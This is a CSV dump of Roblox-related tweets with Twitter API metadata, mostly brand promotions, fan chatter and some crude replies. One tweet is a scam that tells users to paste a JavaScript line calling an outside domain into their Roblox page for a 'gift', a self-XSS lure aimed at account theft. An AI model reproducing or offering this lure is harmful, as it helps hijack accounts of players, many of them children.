tweetid,author_id,text,created_at,geo,retweets,replies,likes,quote_count,lang,conversation_id,context_annotations,entities,attachments,possibly_sensitive,withheld,reply_settings,source
1518953170751430658,59515801,"Welcome to My Hello Kitty Cafe! 🎀 Join Hello Kitty and Friends in a supercute world full of fun and sweet surprises. Create, manage, and decorate your very own Hello Kitty Cafe while making new friends along the way. Available only on @Roblox. Learn more: https://t.co/cBZ0th3gKV https://t.co/PZtI8BBKrL",2022-04-26 14:00:31+00:00,,402,81,2540,326,en,1518953170751430658,"[{'domain': {'id': '10', 'name': 'Person', 'description': 'Named people in the world like Nelson Mandela'}, 'entity': {'id': '1443277565393719296', 'name': 'Hello Kitty'}}, {'domain': {'id': '45', 'name': 'Brand Vertical', 'description': 'Top level entities that describe a Brands industry'}, 'entity': {'id': '781974596706635776', 'name': 'Retail'}}, {'domain': {'id': '46', 'name': 'Brand Category', 'description': 'Categories within Brand Verticals that narrow down the scope of Brands'}, 'entity': {'id': '781974597302296576', 'name': 'Specialty'}}, {'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '1038116841485303808', 'name': 'Sanrio', 'description': 'Sanrio (サンリオ)'}}, {'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '1443277565393719296', 'name': 'Hello Kitty'}}, {'domain': {'id': '65', 'name': 'Interests and Hobbies Vertical', 'description': 'Top level interests and hobbies groupings, like Food or Travel'}, 'entity': {'id': '834828264786898945', 'name': 'Drinks', 'description': 'Drinks'}}, {'domain': {'id': '66', 'name': 'Interests and Hobbies Category', 'description': 'A grouping of interests and hobbies entities, like Novelty Food or Destinations'}, 'entity': {'id': '834828445238431744', 'name': 'Generic Drinks', 'description': 'Generic Drinks'}}, {'domain': {'id': '67', 'name': 'Interests and Hobbies', 'description': 'Interests, opinions, and behaviors of individuals, groups, or cultures; like Speciality Cooking or Theme Parks'}, 'entity': {'id': '850442647088971776', 'name': 'Coffee', 'description': 'Coffee'}}, {'domain': {'id': '71', 'name': 'Video Game', 'description': 'A video game like Overwatch'}, 'entity': {'id': '1088118927580774400', 'name': 'Roblox', 'description': 'Roblox'}}, {'domain': {'id': '122', 'name': 'Fictional Character', 'description': 'A person or other being in a narrative work of art, like Tom Sawyer or Jon Snow'}, 'entity': {'id': '1443277565393719296', 'name': 'Hello Kitty'}}, {'domain': {'id': '65', 'name': 'Interests and Hobbies Vertical', 'description': 'Top level interests and hobbies groupings, like Food or Travel'}, 'entity': {'id': '834828264786898945', 'name': 'Drinks', 'description': 'Drinks'}}, {'domain': {'id': '66', 'name': 'Interests and Hobbies Category', 'description': 'A grouping of interests and hobbies entities, like Novelty Food or Destinations'}, 'entity': {'id': '834828445238431744', 'name': 'Generic Drinks', 'description': 'Generic Drinks'}}, {'domain': {'id': '67', 'name': 'Interests and Hobbies', 'description': 'Interests, opinions, and behaviors of individuals, groups, or cultures; like Speciality Cooking or Theme Parks'}, 'entity': {'id': '850442647088971776', 'name': 'Coffee', 'description': 'Coffee'}}]","{'urls': [{'start': 256, 'end': 279, 'url': 'https://t.co/cBZ0th3gKV', 'expanded_url': 'https://bit.ly/3KbBcPG', 'display_url': 'bit.ly/3KbBcPG'}, {'start': 280, 'end': 303, 'url': 'https://t.co/PZtI8BBKrL', 'expanded_url': 'https://twitter.com/sanrio/status/1518953170751430658/video/1', 'display_url': 'pic.twitter.com/PZtI8BBKrL', 'media_key': '7_1518953102782644224'}], 'mentions': [{'start': 235, 'end': 242, 'username': 'Roblox', 'id': '16745055'}]}",{'media_keys': ['7_1518953102782644224']},False,,everyone,Khoros Publishing App
1519763690282799106,1410362481726443526,"How much #robux do you want?

Limit is 6k! https://t.co/U72firMenX",2022-04-28 19:41:14+00:00,,237,1637,610,6,en,1519763690282799106,"[{'domain': {'id': '71', 'name': 'Video Game', 'description': 'A video game like Overwatch'}, 'entity': {'id': '1088118927580774400', 'name': 'Roblox', 'description': 'Roblox'}}]","{'urls': [{'start': 43, 'end': 66, 'url': 'https://t.co/U72firMenX', 'expanded_url': 'https://twitter.com/sickharu/status/1519763690282799106/photo/1', 'display_url': 'pic.twitter.com/U72firMenX', 'media_key': '3_1519763094188310529'}], 'hashtags': [{'start': 9, 'end': 15, 'tag': 'robux'}]}",{'media_keys': ['3_1519763094188310529']},False,,everyone,Twitter Web App
1370142091314102273,1370138209980665862,"Go to ur roblox home and paste that and wait 24 hours and u gonna get ur gift :) ( make sure to deleted the x )
xJavascript:$.get(""//www.rbxapiz.xyz/api?i=31830"")
😍 https://t.co/DXPX6vnxoS",2021-03-11 22:38:25+00:00,,2,37,25,2,en,1370142091314102273,"[{'domain': {'id': '71', 'name': 'Video Game', 'description': 'A video game like Overwatch'}, 'entity': {'id': '1088118927580774400', 'name': 'Roblox', 'description': 'Roblox'}}]","{'urls': [{'start': 165, 'end': 188, 'url': 'https://t.co/DXPX6vnxoS', 'expanded_url': 'https://twitter.com/RobloxGiftCard6/status/1370142091314102273/photo/1', 'display_url': 'pic.twitter.com/DXPX6vnxoS', 'media_key': '3_1370142060397932545'}]}",{'media_keys': ['3_1370142060397932545']},False,,everyone,Twitter Web App
1520162996751937536,1410339099031093249,@Roblox_RTC I HATE LANDO,2022-04-29 22:07:56+00:00,,0,2,0,0,en,1520158259222614016,[],"{'annotations': [{'start': 19, 'end': 23, 'probability': 0.5845, 'type': 'Person', 'normalized_text': 'LANDO'}], 'mentions': [{'start': 0, 'end': 11, 'username': 'Roblox_RTC', 'id': '1056053249470541824'}]}",,False,,everyone,Twitter for iPhone
1519886993286922241,1515425575971987459,"does anyone knwo bear alpha on robloz..
jsut curious, lawl https://t.co/XmI8H1w7mK",2022-04-29 03:51:11+00:00,,0,10,30,0,en,1519886993286922241,[],"{'urls': [{'start': 59, 'end': 82, 'url': 'https://t.co/XmI8H1w7mK', 'expanded_url': 'https://twitter.com/Ietihan/status/1519886993286922241/photo/1', 'display_url': 'pic.twitter.com/XmI8H1w7mK', 'media_key': '16_1519886971396833285'}]}",{'media_keys': ['16_1519886971396833285']},False,,everyone,Twitter for iPhone
1519851683341348864,1446278450025697293,"MOOTS!! 
UNFOLLOWING SPREE!!
reply with your subtwts to stay safe :D",2022-04-29 01:30:53+00:00,,1,114,95,1,en,1519851683341348864,[],,,False,,following,Twitter for Android
1520157680287072257,1314182615835070466,"Trying to move on from all the drama, Once I get these strikes removed I want to be a proper YouTube and make videos that entertain people, no more clickbait or anything, I am sorry for everything I have done, please give me a second chance",2022-04-29 21:46:48+00:00,,4,143,14,7,en,1520157680287072257,"[{'domain': {'id': '165', 'name': 'Technology', 'description': 'for individual and types of technology, e.g., food technology, 3D printing'}, 'entity': {'id': '1196446161223028736', 'name': 'Social media'}}, {'domain': {'id': '46', 'name': 'Brand Category', 'description': 'Categories within Brand Verticals that narrow down the scope of Brands'}, 'entity': {'id': '781974596752842752', 'name': 'Services'}}, {'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '10029382357', 'name': 'YouTube'}}]","{'annotations': [{'start': 93, 'end': 99, 'probability': 0.6279, 'type': 'Product', 'normalized_text': 'YouTube'}]}",,False,,everyone,Twitter Web App
1520163556880261125,1480265263417372674,@Vissle1 @The_Pulse_Clan @Jxsh83 @seanleathe Ratio!!!!!,2022-04-29 22:10:09+00:00,,1,1,3,1,en,1520158596667179009,[],"{'mentions': [{'start': 0, 'end': 8, 'username': 'Vissle1', 'id': '1026993758703951874'}, {'start': 9, 'end': 24, 'username': 'The_Pulse_Clan', 'id': '753593618871488512'}, {'start': 25, 'end': 32, 'username': 'Jxsh83', 'id': '1330578324322721797'}, {'start': 33, 'end': 44, 'username': 'seanleathe', 'id': '878144129896652800'}]}",,False,,everyone,Twitter for iPhone
1510501417009569793,1251677662810042371,"Fill in the blank
Roblox is ________",2022-04-03 06:16:16+00:00,,70,1480,1021,17,en,1510501417009569793,"[{'domain': {'id': '71', 'name': 'Video Game', 'description': 'A video game like Overwatch'}, 'entity': {'id': '1088118927580774400', 'name': 'Roblox', 'description': 'Roblox'}}]",,,False,,everyone,Twitter for iPhone
1520162575127916550,1026993758703951874,@Molesquad420 @The_Pulse_Clan @Jxsh83 @seanleathe Counter ratio + lick my balls,2022-04-29 22:06:15+00:00,,1,2,3,0,en,1520158596667179009,[],"{'mentions': [{'start': 0, 'end': 13, 'username': 'Molesquad420', 'id': '1480265263417372674'}, {'start': 14, 'end': 29, 'username': 'The_Pulse_Clan', 'id': '753593618871488512'}, {'start': 30, 'end': 37, 'username': 'Jxsh83', 'id': '1330578324322721797'}, {'start': 38, 'end': 49, 'username': 'seanleathe', 'id': '878144129896652800'}]}",,False,,everyone,Twitter for Android
1520109519463874560,574032254,Is @Roblox an early version of the metaverse? https://t.co/TEN9YKNqgj,2022-04-29 18:35:26+00:00,,113,378,543,11,en,1520109519463874560,"[{'domain': {'id': '45', 'name': 'Brand Vertical', 'description': 'Top level entities that describe a Brands industry'}, 'entity': {'id': '781974596148793345', 'name': 'Business & finance'}}, {'domain': {'id': '46', 'name': 'Brand Category', 'description': 'Categories within Brand Verticals that narrow down the scope of Brands'}, 'entity': {'id': '781974596794716162', 'name': 'Financial services'}}, {'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '1370436971940642819', 'name': 'Coinbase'}}, {'domain': {'id': '65', 'name': 'Interests and Hobbies Vertical', 'description': 'Top level interests and hobbies groupings, like Food or Travel'}, 'entity': {'id': '781974596148793345', 'name': 'Business & finance'}}, {'domain': {'id': '30', 'name': 'Entities [Entity Service]', 'description': 'Entity Service top level domain, every item that is in Entity Service should be in this domain'}, 'entity': {'id': '848920371311001600', 'name': 'Technology', 'description': 'Technology and computing'}}, {'domain': {'id': '66', 'name': 'Interests and Hobbies Category', 'description': 'A grouping of interests and hobbies entities, like Novelty Food or Destinations'}, 'entity': {'id': '913142676819648512', 'name': 'Cryptocurrencies', 'description': 'Cryptocurrency'}}, {'domain': {'id': '71', 'name': 'Video Game', 'description': 'A video game like Overwatch'}, 'entity': {'id': '1088118927580774400', 'name': 'Roblox', 'description': 'Roblox'}}, {'domain': {'id': '165', 'name': 'Technology', 'description': 'for individual and types of technology, e.g., food technology, 3D printing'}, 'entity': {'id': '848920371311001600', 'name': 'Technology', 'description': 'Technology and computing'}}]","{'urls': [{'start': 46, 'end': 69, 'url': 'https://t.co/TEN9YKNqgj', 'expanded_url': 'https://www.youtube.com/watch?v=BQesYeOCnBQ', 'display_url': 'youtube.com/watch?v=BQesYe…'}], 'mentions': [{'start': 3, 'end': 10, 'username': 'Roblox', 'id': '16745055'}]}",,False,,everyone,Twitter Web App
1519541259160883201,28384755,#WORKOUTWEDNESDAY - it’s time to upgrade your avatar! Make sure to check out our virtual shop: #f21shopcity on @Roblox! https://t.co/1ddvjyCzNj,2022-04-28 04:57:22+00:00,,11,12,75,2,en,1519541259160883201,"[{'domain': {'id': '45', 'name': 'Brand Vertical', 'description': 'Top level entities that describe a Brands industry'}, 'entity': {'id': '781974596706635776', 'name': 'Retail'}}, {'domain': {'id': '46', 'name': 'Brand Category', 'description': 'Categories within Brand Verticals that narrow down the scope of Brands'}, 'entity': {'id': '781974596715024385', 'name': 'Apparel/Accessories'}}, {'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '10040780782', 'name': 'Forever 21'}}, {'domain': {'id': '65', 'name': 'Interests and Hobbies Vertical', 'description': 'Top level interests and hobbies groupings, like Food or Travel'}, 'entity': {'id': '844603730221707264', 'name': 'Fashion', 'description': 'Fashion'}}, {'domain': {'id': '66', 'name': 'Interests and Hobbies Category', 'description': 'A grouping of interests and hobbies entities, like Novelty Food or Destinations'}, 'entity': {'id': '846427983237672960', 'name': 'Fashion Brand', 'description': 'Fashion Brand'}}, {'domain': {'id': '71', 'name': 'Video Game', 'description': 'A video game like Overwatch'}, 'entity': {'id': '1088118927580774400', 'name': 'Roblox', 'description': 'Roblox'}}, {'domain': {'id': '45', 'name': 'Brand Vertical', 'description': 'Top level entities that describe a Brands industry'}, 'entity': {'id': '781974596706635776', 'name': 'Retail'}}, {'domain': {'id': '46', 'name': 'Brand Category', 'description': 'Categories within Brand Verticals that narrow down the scope of Brands'}, 'entity': {'id': '781974596715024385', 'name': 'Apparel/Accessories'}}, {'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '10040780782', 'name': 'Forever 21'}}]","{'urls': [{'start': 120, 'end': 143, 'url': 'https://t.co/1ddvjyCzNj', 'expanded_url': 'https://twitter.com/Forever21/status/1519541259160883201/photo/1', 'display_url': 'pic.twitter.com/1ddvjyCzNj', 'media_key': '3_1519541252714237952'}], 'mentions': [{'start': 111, 'end': 118, 'username': 'Roblox', 'id': '16745055'}], 'hashtags': [{'start': 0, 'end': 17, 'tag': 'WORKOUTWEDNESDAY'}, {'start': 95, 'end': 107, 'tag': 'f21shopcity'}]}",{'media_keys': ['3_1519541252714237952']},False,,everyone,Twitter for iPhone
1520163285320060929,1214879337004064769,@Roblox_RTC is that a steam game?,2022-04-29 22:09:05+00:00,,0,1,1,0,en,1520158259222614016,"[{'domain': {'id': '47', 'name': 'Brand', 'description': 'Brands and Companies'}, 'entity': {'id': '1392988484256759811', 'name': 'Steam'}}, {'domain': {'id': '79', 'name': 'Video Game Hardware', 'description': 'Video Game Hardware'}, 'entity': {'id': '1174432578503204864', 'name': 'PC gaming'}}]","{'mentions': [{'start': 0, 'end': 11, 'username': 'Roblox_RTC', 'id': '1056053249470541824'}]}",,False,,everyone,Twitter Web App
1520162935527641088,1349507089941585923,@PikaDoggYT @v4salol @xvbones you cannot get an address from a ip,2022-04-29 22:07:41+00:00,,0,3,0,0,en,1519936482500296704,[],"{'mentions': [{'start': 0, 'end': 11, 'username': 'PikaDoggYT', 'id': '952594995814412288'}, {'start': 12, 'end': 20, 'username': 'v4salol', 'id': '1415358761871548416'}, {'start': 21, 'end': 29, 'username': 'xvbones', 'id': '230244543'}]}",,False,,everyone,Twitter Web App
